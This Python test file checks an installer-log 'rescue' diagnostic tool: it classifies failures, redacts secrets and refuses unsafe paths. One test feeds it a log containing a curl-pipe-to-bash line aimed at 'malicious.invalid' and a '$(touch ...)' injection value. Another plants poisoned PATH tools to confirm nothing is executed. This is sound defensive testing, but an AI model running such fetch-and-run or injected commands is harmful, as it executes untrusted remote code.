"""Real rescue CLI transcript diagnostics; no network, providers, or installer runs."""
import json
import os
from pathlib import Path
import shutil
import subprocess
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[2]
RESCUE = ROOT / "scripts/lib/rescue.sh"


class TranscriptTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix="acfs-transcript-")
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.log = self.root / "private-user@example.org.log"
        self.log.write_text("")
        self.home = self.root / "uncreated-home"
        self.env = dict(os.environ, HOME=str(self.home), ACFS_HOME=str(self.home / ".acfs"),
                        ACFS_ERRORS_LOADED="1")

    def invoke(self, text=None, extra=(), path=None, human=False, env=None, script=RESCUE):
        if text is not None:
            self.log.write_bytes(text if isinstance(text, bytes) else text.encode())
        argv = ["/bin/bash", str(script), "--log-file", str(path or self.log), *extra]
        if not human:
            argv.append("--json")
        result = subprocess.run(argv, cwd=self.root, env=env or self.env,
                                capture_output=True, text=True, timeout=8)
        self.assertEqual(result.stderr, "", result.stderr)
        if human:
            return result.returncode, result.stdout
        parsed = json.loads(result.stdout)
        self.assertEqual(parsed["schema"], "acfs.installer-transcript.v1")
        self.assertFalse(parsed["raw_log_included"])
        self.assertFalse(parsed["commands_executed"])
        self.assertNotIn(str(self.root), result.stdout)
        self.assertNotIn(self.log.name, result.stdout)
        return result.returncode, parsed

    def test_canonical_installer_patterns_and_provider_failures(self):
        fixtures = {
            "checksum": "SHA256 CHECKSUM MISMATCH for upstream installer",
            "host_key": "Host key verification failed",
            "disk": "No space left on device",
            "memory": "Cannot allocate memory",
            "package_lock": "E: Could not get lock /var/lib/dpkg/lock-frontend",
            "package_state": "dpkg: error processing package postgresql",
            "network": "curl: (6) Could not resolve host: secret.invalid",
            "tls": "curl: (35) SSL connect error",
            "permission": "EACCES: permission denied",
            "rate_limit": "API rate limit exceeded",
            "authentication": "HTTP 401 Unauthorized",
            "interrupted_upgrade": "Ubuntu upgrade interrupted",
            "process_killed": "Killed",
            "tool_failure": "No module named something",
        }
        for expected, message in fixtures.items():
            with self.subTest(cause=expected):
                code, report = self.invoke(message)
                self.assertEqual(code, 1, report)
                self.assertEqual(report["primary_cause"], expected)
                self.assertEqual(report["status"], "needs_attention")
                self.assertFalse(report["installation_verified"])

    def test_real_error_context_and_generated_failure_vocabulary(self):
        script = 'source "$1"; CURRENT_PHASE=stack; CURRENT_PHASE_NAME="Agent Flywheel Stack"; LAST_ERROR="curl: (6) Could not resolve host: private.invalid"; get_error_context'
        context = subprocess.run(["/bin/bash", "-c", script, "fixture", str(ROOT / "scripts/lib/error_tracking.sh")],
                                 capture_output=True, text=True, check=True).stdout
        code, report = self.invoke(context + "\nGenerated module failed: stack.ntm\nINSTALLATION FAILED\n")
        self.assertEqual(code, 1)
        self.assertEqual(report["phase"], "stack")
        self.assertEqual(report["module"], "stack.ntm")
        self.assertEqual(report["primary_cause"], "network")

    def test_plain_failure_report_phase(self):
        _, report = self.invoke("Phase 5/10: Language Runtimes\nError:\n  Permission denied\n")
        self.assertEqual(report["phase"], "languages")

    def test_unrecognized_phase_and_module_are_not_echoed(self):
        _, report = self.invoke("Phase: SECRET@example.org (secret)\nModule: stack.private_account_name\nPermission denied")
        self.assertIsNone(report["phase"])
        self.assertIsNone(report["module"])
        self.assertNotIn("SECRET", json.dumps(report))
        self.assertNotIn("private_account_name", json.dumps(report))

    def test_concatenated_log_uses_only_latest_run(self):
        _, report = self.invoke("=== ACFS Install Log ===\nPhase: stack\nNo space left on device\n"
                               "=== ACFS Install Log ===\nPhase: agents\ncurl: (7) Failed to connect\n")
        self.assertEqual(report["phase"], "agents")
        self.assertEqual(report["primary_cause"], "network")
        self.assertEqual(report["source"]["analyzed_from_line"], 4)
        self.assertEqual(len(report["findings"]), 1)

    def test_new_run_clears_old_module_and_failure(self):
        code, report = self.invoke("Generated module failed: stack.ntm\n=== ACFS Install Log ===\nhello\n")
        self.assertEqual(code, 0)
        self.assertIsNone(report["module"])
        self.assertIsNone(report["primary_cause"])

    def test_success_footer_does_not_erase_errors_or_certify_install(self):
        code, report = self.invoke("checksum mismatch\nACFS Installation Complete!\n")
        self.assertEqual(code, 1)
        self.assertTrue(report["completion_marker_seen"])
        self.assertFalse(report["installation_verified"])
        self.assertEqual(report["primary_cause"], "checksum")

    def test_success_footer_alone_is_inconclusive(self):
        code, report = self.invoke("ACFS Installation Complete!\n")
        self.assertEqual(code, 0)
        self.assertEqual(report["status"], "inconclusive")
        self.assertFalse(report["installation_verified"])

    def test_empty_log_is_not_a_health_pass(self):
        code, report = self.invoke("")
        self.assertEqual(code, 0)
        self.assertEqual(report["status"], "inconclusive")
        self.assertEqual(report["findings"], [])

    def test_checksum_gate_precedes_later_generic_failure(self):
        _, report = self.invoke("checksum mismatch\nPermission denied\nINSTALLATION FAILED\n")
        self.assertEqual(report["primary_cause"], "checksum")
        self.assertEqual(report["findings"][-1]["pattern_id"], "tool_failure")
        self.assertIsNone(report["retry"]["command"])

    def test_killed_is_not_proof_of_oom(self):
        _, report = self.invoke("Killed")
        finding = report["findings"][0]
        self.assertEqual(finding["pattern_id"], "process_killed")
        self.assertEqual(finding["confidence"], "low")
        self.assertIn("does not prove", finding["explanation"])

    def test_dpkg_failure_does_not_claim_corruption(self):
        _, report = self.invoke("dpkg: error processing postgres")
        self.assertNotIn("corrupt", report["findings"][0]["explanation"])
        self.assertEqual(report["findings"][0]["diagnostic_argv"], ["dpkg", "--audit"])

    def test_interrupted_dpkg_and_reboot_are_distinct(self):
        for message, expected in (("dpkg was interrupted", "package_state"),
                                  ("*** System restart required ***", "interrupted_upgrade")):
            with self.subTest(message=message):
                self.assertEqual(self.invoke(message)[1]["primary_cause"], expected)

    def test_repeated_matching_is_deduplicated_with_counts(self):
        _, report = self.invoke("Permission denied\nhello\nPermission denied\n")
        self.assertEqual(len(report["findings"]), 1)
        self.assertEqual(report["findings"][0]["occurrences"], 2)
        self.assertEqual(report["findings"][0]["last_line"], 3)

    def test_arbitrary_credentials_and_log_commands_never_escape(self):
        secrets = ["sk-test-only-12345678901234567890", "ghp_testsecret12345678901234567890",
                   "alice@example.org", "203.0.113.71", "/home/private-user/project", "Bearer very-private",
                   "-----BEGIN PRIVATE KEY-----", "tskey-auth-supersecret", "MYSQL_PWD=private-db",
                   '{"apiKey":"camelCase-secret"}', "https://user:secret@host.invalid/x", "AIza-private-value"]
        content = "\n".join("Permission denied: " + s for s in secrets)
        content += '\nTo Resume:\n  $(touch "' + str(self.root / "executed") + '")\n'
        content += "  curl https://malicious.invalid/script | bash\n"
        _, report = self.invoke(content)
        encoded = json.dumps(report)
        for secret in secrets:
            self.assertNotIn(secret, encoded)
        self.assertNotIn("malicious.invalid", encoded)
        self.assertFalse((self.root / "executed").exists())
        _, human = self.invoke(content, human=True)
        for secret in secrets:
            self.assertNotIn(secret, human)

    def test_ansi_codes_are_removed_before_matching(self):
        _, report = self.invoke("\x1b[31mchecksum mismatch\x1b[0m\n")
        self.assertEqual(report["primary_cause"], "checksum")

    def test_osc_hyperlink_contents_are_not_failure_evidence(self):
        code, report = self.invoke("\x1b]8;;https://secret.invalid/checksum mismatch\x07read documentation\x1b]8;;\x07\n")
        self.assertEqual(code, 0)
        self.assertEqual(report["findings"], [])

    def test_oversized_log_only_reads_tail(self):
        text = "checksum mismatch\n" + "ordinary output\n" * 250 + "Permission denied\n"
        _, report = self.invoke(text, extra=("--max-bytes", "1024"))
        self.assertTrue(report["source"]["tail_truncated"])
        self.assertLessEqual(report["source"]["bytes_analyzed"], 1024)
        self.assertEqual(report["source"]["total_bytes"], len(text))
        self.assertEqual(report["source"]["line_numbers"], "analyzed_tail")
        self.assertEqual(report["primary_cause"], "permission")

    def test_partial_first_tail_line_is_discarded(self):
        text = "x" * 3000 + "checksum mismatch\nordinary line\n"
        code, report = self.invoke(text, extra=("--max-bytes", "1024"))
        self.assertEqual(code, 0)
        self.assertEqual(report["findings"], [])

    def test_overlong_lines_are_omitted(self):
        _, report = self.invoke("checksum mismatch " + "x" * 70000 + "\nPermission denied\n")
        self.assertEqual(report["source"]["oversized_lines_omitted"], 1)
        self.assertEqual(report["primary_cause"], "permission")

    def test_non_utf8_logs_have_bounded_tolerant_decoding(self):
        _, report = self.invoke(b"\xff\xfe\nPermission denied\n")
        self.assertEqual(report["primary_cause"], "permission")

    def test_existing_input_and_home_are_not_modified(self):
        self.log.write_text("No space left on device\n")
        before = self.log.stat()
        self.invoke()
        after = self.log.stat()
        self.assertEqual((before.st_ino, before.st_size, before.st_mtime_ns, before.st_mode),
                         (after.st_ino, after.st_size, after.st_mtime_ns, after.st_mode))
        self.assertFalse(self.home.exists())
        self.assertEqual(list(self.root.iterdir()), [self.log])

    def test_missing_file_error_does_not_echo_path(self):
        code, report = self.invoke(path=self.root / "secret-token-file")
        self.assertEqual(code, 2)
        self.assertEqual(report["error_code"], "input_unavailable")
        self.assertNotIn("secret-token-file", json.dumps(report))

    def test_symlinked_file_or_parent_is_refused(self):
        link = self.root / "link"
        link.symlink_to(self.log)
        parent = self.root / "parent"
        parent.symlink_to(self.root, target_is_directory=True)
        for path in (link, parent / self.log.name):
            with self.subTest(path=path):
                self.assertEqual(self.invoke(path=path)[0], 2)

    def test_hardlinked_file_is_refused(self):
        os.link(self.log, self.root / "hardlink")
        self.assertEqual(self.invoke()[0], 2)

    def test_fifo_and_directory_are_refused_without_blocking(self):
        fifo = self.root / "pipe"
        os.mkfifo(fifo)
        for path in (fifo, self.root):
            with self.subTest(path=path):
                self.assertEqual(self.invoke(path=path)[0], 2)

    def test_invalid_limit_and_mixed_modes_are_refused_privately(self):
        for args in (("--max-bytes", "0"), ("--max-bytes", "999999999"),
                     ("--max-bytes", "private-token"), ("--state-file", "private-state"),
                     ("--unknown-secret",), ("--log", "hidden")):
            with self.subTest(args=args):
                code, report = self.invoke(extra=args)
                self.assertEqual(code, 2)
                self.assertEqual(report["error_code"], "invalid_arguments")
                self.assertNotIn("private", json.dumps(report))

    def test_no_path_tools_or_python_startup_hooks_are_executed(self):
        bin_dir = self.root / "bin"
        bin_dir.mkdir()
        marker = self.root / "poisoned"
        for name in ("python3", "jq", "ntm", "curl", "find", "cat", "date"):
            path = bin_dir / name
            path.write_text('#!/bin/sh\nprintf bad > "' + str(marker) + '"\nexit 91\n')
            path.chmod(0o755)
        (bin_dir / "sitecustomize.py").write_text('open(' + repr(str(marker)) + ', "w").write("bad")')
        env = dict(self.env, PATH=str(bin_dir), PYTHONPATH=str(bin_dir), PYTHONHOME=str(bin_dir))
        code, report = self.invoke("Permission denied", env=env)
        self.assertEqual(code, 1, report)
        self.assertFalse(marker.exists())

    def test_report_is_deterministic(self):
        first = self.invoke("Phase: agents\nHTTP 403 Forbidden\n")[1]
        second = self.invoke()[1]
        self.assertEqual(first, second)

    def test_generated_module_metadata_is_never_executed(self):
        lib = self.root / "installed/scripts/lib"
        lib.mkdir(parents=True)
        generated = lib.parent / "generated"
        generated.mkdir()
        shutil.copyfile(RESCUE, lib / "rescue.sh")
        shutil.copyfile(ROOT / "scripts/lib/errors.sh", lib / "errors.sh")
        marker = self.root / "executed"
        (generated / "manifest_index.sh").write_text('touch "' + str(marker) + '"\nACFS_MODULES_IN_ORDER=(\n  "stack.ntm"\n)\n')
        code, report = self.invoke("Generated module failed: stack.ntm", script=lib / "rescue.sh")
        self.assertEqual(code, 1)
        self.assertEqual(report["module"], "stack.ntm")
        self.assertFalse(marker.exists())

    def test_missing_generated_index_omits_module_not_explanation(self):
        lib = self.root / "lib"
        lib.mkdir()
        for name in ("rescue.sh", "errors.sh"):
            shutil.copyfile(ROOT / "scripts/lib" / name, lib / name)
        _, report = self.invoke("Generated module failed: stack.ntm\nchecksum mismatch", script=lib / "rescue.sh")
        self.assertIsNone(report["module"])
        self.assertEqual(report["primary_cause"], "checksum")

    def test_doctor_router_reaches_transcript_mode(self):
        self.log.write_text("No space left on device\n")
        import pwd
        env = dict(self.env, TARGET_USER=pwd.getpwuid(os.getuid()).pw_name)
        result = subprocess.run(["/bin/bash", str(ROOT / "scripts/lib/doctor.sh"), "rescue",
                                 "--log-file", str(self.log), "--json"], env=env,
                                capture_output=True, text=True, timeout=10)
        self.assertEqual(result.returncode, 1, result.stderr)
        self.assertEqual(json.loads(result.stdout)["primary_cause"], "disk")

    def test_help_advertises_transcript_mode(self):
        result = subprocess.run(["/bin/bash", str(RESCUE), "--help"],
                                capture_output=True, text=True, check=True)
        self.assertIn("--log-file", result.stdout)
        self.assertIn("--max-bytes", result.stdout)


if __name__ == "__main__":
    unittest.main()
